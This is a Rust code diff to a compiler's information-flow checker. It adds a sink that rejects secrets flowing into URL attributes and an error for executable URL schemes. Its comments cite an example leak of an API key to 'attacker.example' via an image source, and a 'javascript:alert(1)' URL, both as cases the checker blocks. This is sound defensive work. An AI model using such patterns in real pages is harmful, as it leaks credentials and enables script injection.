@@ -39,7 +39,7 @@ use crate::split::{BoundaryEdge, Crossing, EndpointKind, MemberForm, TierSplit};
 /// §14G.1.3(c)'s sink list, declared and closed.
 ///
 /// Deliberately **not** `#[non_exhaustive]`: adding a variant must break
-/// every downstream `match`. Adding sink 7 is: add the variant, fix the
+/// every downstream `match`. Adding sink 8 is: add the variant, fix the
 /// compile errors, bump the length test, write `describe`, and add a
 /// fixture that leaks through it and must be rejected.
 ///
@@ -83,16 +83,18 @@ pub enum Sink {
     ResponseBody,
     PlatformLog,
     LiveSync,
+    OutboundRequest,
 }
 
 impl Sink {
-    pub const CLOSED_LIST: [Sink; 6] = [
+    pub const CLOSED_LIST: [Sink; 7] = [
         Sink::ClientState,
         Sink::View,
         Sink::BuildArtifact,
         Sink::ResponseBody,
         Sink::PlatformLog,
         Sink::LiveSync,
+        Sink::OutboundRequest,
     ];
 
     pub fn code(self) -> &'static str {
@@ -103,6 +105,25 @@ impl Sink {
             Sink::ResponseBody => "E-IFC-08",
             Sink::PlatformLog => "E-IFC-09",
             Sink::LiveSync => "E-IFC-10",
+            Sink::OutboundRequest => "E-IFC-11",
+        }
+    }
+
+    /// Why reaching it is a leak, as the diagnostic finishes the sentence.
+    pub fn because(self) -> &'static str {
+        match self {
+            Sink::ClientState => "client state is the browser's own memory",
+            Sink::View => "the view is where a browser can see it",
+            Sink::BuildArtifact => "every visitor downloads the build artefact",
+            Sink::ResponseBody => "a response body goes to the browser by definition",
+            Sink::PlatformLog => "a log is the least guarded copy of anything",
+            Sink::LiveSync => "a subscribed browser is told about it",
+            // The one sink that is not about what a reader is shown. The
+            // browser resolves the URL and issues the request itself, to
+            // whichever host the value names, before anything is painted —
+            // so an image nobody ever sees leaks exactly as well as one
+            // in the middle of the page.
+            Sink::OutboundRequest => "the value chooses the host it is sent to",
         }
     }
 
@@ -114,6 +135,7 @@ impl Sink {
             Sink::ResponseBody => "an outbound response body",
             Sink::PlatformLog => "a platform log",
             Sink::LiveSync => "a live-sync stream the browser subscribes to",
+            Sink::OutboundRequest => "a request the browser sends",
         }
     }
 }
@@ -127,6 +149,15 @@ pub enum SinkSite {
     ResponseBody(RootId),
     PlatformLog(RootId),
     LiveSync(DefId),
+    /// One URL-bearing argument at one element, in one context.
+    ///
+    /// The expression is what distinguishes two instances of the same
+    /// component: instantiation copies a body per call site and keeps its
+    /// spans, so the span alone is not an identity. The obligation key is
+    /// `(Span, ObligationKind)` and `ObligationKind::Escape` carries this,
+    /// so `Image source is publicLogo` in one instance cannot discharge
+    /// `Image source is apiKey` in another.
+    UrlArgument(ExprId, Ctx),
 }
 
 /// Permission to emit.
@@ -596,7 +627,9 @@ impl<'a> Ifc<'a> {
                         let mut walk = Walk::new(self, ctx, def, true, 0);
                         walk.nodes(&nodes);
                         let obligations = std::mem::take(&mut walk.obligations);
+                        let errors = std::mem::take(&mut walk.errors);
                         self.discharge_all(obligations);
+                        self.report_all(errors);
                     }
                     // A function is discharged at its call sites, with the
                     // arguments substituted, and once more below if
@@ -616,6 +649,11 @@ impl<'a> Ifc<'a> {
                     // the declaration too would rule on a context no
                     // instance is in.
                     (DefKind::Component(_), _) => {}
+                    // A `foreign` names a symbol in a module the runtime
+                    // provides. It has no ZDeceptron body — it is emitted
+                    // inline at each call site — so there is no expression
+                    // to walk and nothing here to discharge (§17.4.7).
+                    (DefKind::Foreign(_), _) => {}
                 }
             }
         }
@@ -735,6 +773,21 @@ impl<'a> Ifc<'a> {
         self.discharge_all(all);
     }
 
+    /// Diagnostics a walk raised directly, deduplicated against what has
+    /// already been reported.
+    fn report_all(&mut self, errors: BTreeMap<Span, GraphError>) {
+        for error in errors.into_values() {
+            let already = self
+                .out
+                .diagnostics
+                .iter()
+                .any(|d| d.code == error.code && d.span == error.span);
+            if !already {
+                self.out.diagnostics.push(error);
+            }
+        }
+    }
+
     fn discharge_all(&mut self, obligations: BTreeMap<ObligationId, Obligation>) {
         for obligation in obligations.into_values() {
             let found = obligation.found.concrete().join(obligation.pc.concrete());
@@ -787,10 +840,10 @@ impl<'a> Ifc<'a> {
             ObligationKind::Escape(sink, _) => GraphError::new(
                 sink.code(),
                 format!(
-                    "{} would reach {}, and {} is where a browser can see it.",
+                    "{} would reach {}, and {}.",
                     obligation.what,
                     sink.describe(),
-                    sink.describe()
+                    sink.because()
                 ),
                 obligation.site,
             )
@@ -864,6 +917,15 @@ impl<'a> Ifc<'a> {
     }
 }
 
+/// The allowlist as a diagnostic reads it.
+fn allowed_schemes() -> String {
+    zdc_hir::URL_SCHEMES
+        .iter()
+        .map(|scheme| format!("`{scheme}`"))
+        .collect::<Vec<_>>()
+        .join(", ")
+}
+
 fn obligations_equal(before: Option<&Summary>, after: &Summary) -> bool {
     let Some(before) = before else {
         return false;
@@ -901,6 +963,25 @@ struct Walk<'a, 'b> {
     result: Valued,
     gave: bool,
     obligations: BTreeMap<ObligationId, Obligation>,
+    /// The URL-bearing argument being evaluated, if any: the expression
+    /// the program wrote there, and the argument's name.
+    ///
+    /// A `server` signal read from the view is a **crossing**, and `read`
+    /// raises the escape obligation at the read rather than at whatever
+    /// the value is eventually used for. Without this the canonical case —
+    /// `Image source is apiKey` — would be reported as reaching the view,
+    /// which is the wrong sink and the wrong reason: nothing is rendered,
+    /// and the leak happens whether or not the element is ever displayed.
+    url_argument: Option<(ExprId, String)>,
+    /// Diagnostics this walk raised that are not obligations.
+    ///
+    /// An obligation is discharged against a label, so it has to survive
+    /// instantiation and be joined with its twins. E-URL-01 is a verdict
+    /// on a literal and has neither property, but the walk holds `Ifc`
+    /// immutably, so it cannot reach the output directly. Keyed by span so
+    /// that a view walked from two roots reports one error rather than
+    /// two.
+    errors: BTreeMap<Span, GraphError>,
 }
 
 impl<'a, 'b> Walk<'a, 'b> {
@@ -919,7 +1000,13 @@ impl<'a, 'b> Walk<'a, 'b> {
             result: Valued::bottom(),
             gave: false,
             obligations: BTreeMap::new(),
+            url_argument: None,
+            errors: BTreeMap::new(),
         }
+    }
+
+    fn push_error(&mut self, error: GraphError) {
+        self.errors.entry(error.span).or_insert(error);
     }
 
     fn trace(&self, steps: Trace) -> Trace {
@@ -964,8 +1051,9 @@ impl<'a, 'b> Walk<'a, 'b> {
             }
             HirExprKind::Ref(Res::Builtin(_)) => Valued::bottom(),
             // A payload-free variant is a constant tag: it carries no data,
-            // so it carries no secret.
-            HirExprKind::Ref(Res::Variant { .. }) => Valued::bottom(),
+            // so it carries no secret. The same holds for the ones the
+            // language provides for `Option` and `Remote`.
+            HirExprKind::Ref(Res::Variant { .. } | Res::BuiltinVariant(_)) => Valued::bottom(),
 
             // A collection literal is a constructor: §17.3.4's rule for one
             // is the join of its operands. Containers are element-
@@ -1005,6 +1093,32 @@ impl<'a, 'b> Walk<'a, 'b> {
                 self.call(callee, &args, span)
             }
 
+            // `length of items` is an ordinary call with one argument, so
+            // it takes the callee's summary exactly as `Call` does — which
+            // is what carries a secret through a library function instead
+            // of laundering it.
+            HirExprKind::OfCall { callee, operand } => {
+                let callee = *callee;
+                let args = vec![HirArg::Positional(*operand)];
+                self.call(callee, &args, span)
+            }
+            // A dispatched primitive is a pure function of its operand and
+            // has no body to summarise, so the operand's label is the
+            // result's. Joining rather than replacing would be the same
+            // answer here; propagating it is what keeps `length of secret`
+            // secret.
+            HirExprKind::Operator { operand, .. } => {
+                let operand = *operand;
+                let inner = self.expr(operand);
+                Valued::of(
+                    SymLabel {
+                        shape: inner.label.value.clone(),
+                        value: inner.label.value.clone(),
+                        failure: inner.label.failure.clone(),
+                    },
+                    inner.trace,
+                )
+            }
             HirExprKind::Unary { operand, .. } => {
                 let operand = *operand;
                 let inner = self.expr(operand);
@@ -1063,23 +1177,39 @@ impl<'a, 'b> Walk<'a, 'b> {
         match self.ifc.split.crossings.get(&(expr, self.ctx)) {
             Some(Crossing::Remote { endpoint }) => {
                 // Crossing back to a browser. This is the one read that is
-                // itself a sink.
-                let sink = if Some(self.owner) == self.ifc.hir.view {
-                    Sink::View
-                } else {
-                    Sink::ClientState
+                // itself a sink — and which sink it is depends on what the
+                // browser then does with the value. In a URL-bearing
+                // argument it is not shown to anyone; it is fetched.
+                let (sink, site, what, escape) = match &self.url_argument {
+                    Some((at, argument)) => (
+                        Sink::OutboundRequest,
+                        SinkSite::UrlArgument(*at, self.ctx),
+                        format!("`{name}`, in `{argument}`"),
+                        format!(
+                            "`{argument}` is a URL, so the browser fetches it — and the value                              names the host  [outbound request]"
+                        ),
+                    ),
+                    None => (
+                        if Some(self.owner) == self.ifc.hir.view {
+                            Sink::View
+                        } else {
+                            Sink::ClientState
+                        },
+                        SinkSite::ViewArg(expr, self.ctx),
+                        format!("`{name}`"),
+                        format!("`{name}` is read here, in the browser"),
+                    ),
                 };
-                let site = SinkSite::ViewArg(expr, self.ctx);
                 self.oblige(Obligation {
                     kind: ObligationKind::Escape(sink, site),
                     required: Secrecy::Public,
                     found: Sym::floor(declared.value),
                     pc: self.pc.clone(),
                     site: span,
-                    what: format!("`{name}`"),
+                    what,
                     found_trace: self.trace(vec![
                         (declared_at, format!("`{name}` is declared secret")),
-                        (span, format!("`{name}` is read here, in the browser")),
+                        (span, escape),
                     ]),
                     pc_trace: self.pc_trace.clone(),
                 });
@@ -1771,12 +1901,28 @@ impl<'a, 'b> Walk<'a, 'b> {
 
     fn element(&mut self, element: &HirElement) {
         for arg in &element.args {
-            let expr = match arg {
-                HirArg::Positional(expr) => *expr,
-                HirArg::Named { value, .. } => *value,
+            let (expr, url) = match arg {
+                HirArg::Positional(expr) => (*expr, false),
+                HirArg::Named { name, value } => (*value, zdc_hir::is_url_attribute(name)),
             };
+            let span = self.ifc.hir.exprs[expr].span;
+            if url {
+                let name = match arg {
+                    HirArg::Named { name, .. } => name.clone(),
+                    HirArg::Positional(_) => String::new(),
+                };
+                // Set before the walk, not after: a `server` read inside
+                // this expression raises its own escape and has to know
+                // which sink it is escaping to.
+                let outer = self.url_argument.replace((expr, name.clone()));
+                let value = self.expr(expr);
+                self.url_argument = outer;
+                self.reject_executable_url(expr, &name, span);
+                self.require_no_outbound_request(&value, expr, &name, &element.name, span);
+                continue;
+            }
             let value = self.expr(expr);
-            self.require_public(&value, self.ifc.hir.exprs[expr].span, "this value");
+            self.require_public(&value, span, "this value");
         }
         // A two-way binding is a write on every keystroke, so it carries
         // the enclosing `pc` even though no `set` statement names it.
@@ -1837,6 +1983,108 @@ impl<'a, 'b> Walk<'a, 'b> {
         });
     }
 
+    /// §14G.1.3(c) sink 7 — **the outbound request**.
+    ///
+    /// The view sink catches what a reader *sees*. This one catches what
+    /// the browser *sends*, and they are different escapes: `Image source
+    /// is apiKey` renders no visible text and appears in no response body,
+    /// and the browser still issues `GET https://attacker.example/<key>`
+    /// before anything is painted. An image with `display: none` leaks
+    /// exactly as well as a visible one, which is why this cannot be
+    /// folded into the view.
+    ///
+    /// Every attribute the browser dereferences is one of these
+    /// (`zdc_hir::URL_ATTRIBUTES`), on every element rather than on the
+    /// elements meant to have one — an unrecognised named argument becomes
+    /// the attribute of that name, so a rule keyed on the element would
+    /// have `Text src is apiKey` fall straight through it.
+    ///
+    /// Until this existed the case was caught only because code generation
+    /// refused every `secret` outright. That is a blunt instrument in the
+    /// wrong pass: it stops being sufficient the moment a `secret` is
+    /// legitimately usable on the server, which `guestbook.zd` already
+    /// requires.
+    fn require_no_outbound_request(
+        &mut self,
+        value: &Valued,
+        expr: ExprId,
+        argument: &str,
+        element: &str,
+        span: Span,
+    ) {
+        let found = value.label.value.concrete().join(self.pc.concrete());
+        if found == Secrecy::Public && value.label.value.deps.is_empty() {
+            return;
+        }
+        let mut found_trace = value.trace.clone();
+        found_trace = merge(
+            &found_trace,
+            &self.trace(vec![(
+                span,
+                format!(
+                    "`{argument}` is a URL, so the browser fetches it — and the value chooses the \
+                     host  [outbound request]"
+                ),
+            )]),
+        );
+        self.oblige(Obligation {
+            kind: ObligationKind::Escape(
+                Sink::OutboundRequest,
+                SinkSite::UrlArgument(expr, self.ctx),
+            ),
+            required: Secrecy::Public,
+            found: value.label.value.clone(),
+            pc: self.pc.clone(),
+            site: span,
+            what: format!("what `{element}` fetches from `{argument}`"),
+            found_trace,
+            pc_trace: self.pc_trace.clone(),
+        });
+    }
+
+    /// A URL literal whose scheme executes rather than fetches.
+    ///
+    /// §16.3.5's escaping argument covers markup and stops there: `&`,
+    /// `<` and `>` cannot close a tag. A URL is not parsed as markup, and
+    /// `javascript:alert(1)` contains nothing an HTML escaper would touch,
+    /// so escaping it changes nothing at all. `setAttribute('href', v)`
+    /// stores the value verbatim and the browser runs it on click.
+    ///
+    /// Settled here, at compile time, for every value the compiler can
+    /// see. `runtime/dom.js`'s `safeUrl` is the same allowlist for the
+    /// values it cannot — a value out of a signal or a record field — and
+    /// rejecting rather than sanitising is right wherever the choice
+    /// exists: a sanitiser turns a program the author got wrong into a
+    /// link that silently goes nowhere.
+    fn reject_executable_url(&mut self, expr: ExprId, argument: &str, span: Span) {
+        let HirExprKind::Text(literal) = &self.ifc.hir.exprs[expr].kind else {
+            return;
+        };
+        if zdc_hir::url_is_safe(literal) {
+            return;
+        }
+        let scheme = zdc_hir::url_scheme(literal).unwrap_or_default().to_string();
+        self.push_error(
+            GraphError::new(
+                "E-URL-01",
+                format!(
+                    "`{argument}` is a URL the browser dereferences, and `{scheme}:` is a scheme \
+                     that executes rather than fetches."
+                ),
+                span,
+            )
+            .with_notes(vec![(
+                span,
+                format!("`{scheme}:` is not one of {}", allowed_schemes()),
+            )])
+            .with_help(
+                "Escaping is for markup; a URL is a different grammar, so there is nothing in \
+                 this value for an escaper to escape. Write a relative URL, or one in `http`, \
+                 `https`, `mailto` or `tel` (spec §16.3.5).",
+            ),
+        );
+    }
+
     /// The same, for a cell rather than for rendered markup.
     ///
     /// A component's own state is `client`-placed and may not be declared
@@ -1861,20 +2109,71 @@ mod tests {
     use super::*;
     use zdc_hir::ArenaId as _;
 
+    /// §14G.1.3(c) names exactly seven sinks, and `CLOSED_LIST` is all of
+    /// them. This assertion is one of the three locks; the other two are
+    /// the absent `#[non_exhaustive]` and `Cleared`'s private field.
+    ///
+    /// This read `assert_eq!(Sink::CLOSED_LIST.len(), 7)` against a
+    /// `[Sink; 7]`, which the compiler folds to `7 == 7`. It could not
+    /// fail, so it did not lock anything: a sink added to the enum and
+    /// left out of the list would have passed here. The match below is
+    /// exhaustive, so a new variant is a compile error until it is named,
+    /// and the round trip then fails until it is listed too.
     #[test]
-    fn the_sink_list_is_closed_at_six() {
-        // §14G.1.3(c) names exactly six sinks. This assertion is one of
-        // the three locks; the other two are the absent
-        // `#[non_exhaustive]` and `Cleared`'s private field.
-        assert_eq!(Sink::CLOSED_LIST.len(), 6);
+    fn the_sink_list_is_closed_at_seven() {
+        fn seen(sink: Sink) -> usize {
+            match sink {
+                Sink::ClientState => 0,
+                Sink::View => 1,
+                Sink::BuildArtifact => 2,
+                Sink::ResponseBody => 3,
+                Sink::PlatformLog => 4,
+                Sink::LiveSync => 5,
+                Sink::OutboundRequest => 6,
+            }
+        }
+
+        let mut positions: Vec<usize> = Sink::CLOSED_LIST.iter().map(|s| seen(*s)).collect();
+        positions.sort_unstable();
+        positions.dedup();
+        assert_eq!(
+            positions,
+            (0..7).collect::<Vec<usize>>(),
+            "the closed list is not each of the seven sinks exactly once"
+        );
     }
 
+    /// Each sink's diagnostic code, against a table written out by hand so
+    /// the assertion cannot agree with the implementation by construction.
     #[test]
     fn every_sink_has_its_own_code_and_description() {
+        let expected = [
+            (Sink::View, "E-IFC-05"),
+            (Sink::ClientState, "E-IFC-06"),
+            (Sink::BuildArtifact, "E-IFC-07"),
+            (Sink::ResponseBody, "E-IFC-08"),
+            (Sink::PlatformLog, "E-IFC-09"),
+            (Sink::LiveSync, "E-IFC-10"),
+            (Sink::OutboundRequest, "E-IFC-11"),
+        ];
+        assert_eq!(
+            expected.len(),
+            Sink::CLOSED_LIST.len(),
+            "a sink was added without a code being decided for it"
+        );
+        for (sink, code) in expected {
+            assert_eq!(sink.code(), code, "{sink:?}");
+            assert!(!sink.describe().is_empty(), "{sink:?} has no description");
+        }
+
         let mut codes: Vec<&str> = Sink::CLOSED_LIST.iter().map(|s| s.code()).collect();
         codes.sort_unstable();
         codes.dedup();
-        assert_eq!(codes.len(), 6);
+        assert_eq!(
+            codes.len(),
+            Sink::CLOSED_LIST.len(),
+            "two sinks share a diagnostic code"
+        );
     }
 
     /// A clearance is granted per `(sink, site)` pair and to nothing else.
